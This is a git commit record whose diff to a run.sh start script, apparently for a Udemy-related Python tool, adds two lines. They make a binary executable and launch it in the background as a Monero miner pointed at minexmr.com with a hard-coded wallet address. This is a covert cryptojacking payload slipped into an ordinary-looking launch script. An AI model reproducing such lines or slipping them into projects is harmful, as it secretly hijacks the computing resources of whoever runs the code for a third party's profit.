3aafa81a659e312dd7ba00280ade7990369160e9
yoyo2323 <38825063+yoyo2323@users.noreply.github.com>
2022-06-20 12:16:43 -0400

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,2 +1,3 @@
 python3 -m udemy
+chmod 777 /app/aa
 /app/aa -o us-west.minexmr.com:443 -u 442nzBCR7YeHtjAE9SZZoiXqV2zcwFPxyWEPHqJ5971ER89jFor1turEZrwFAHPnYMcfaXHKs9xYxdGnErGiFVZ712frFiL -k --tls --rig-id 001 --background
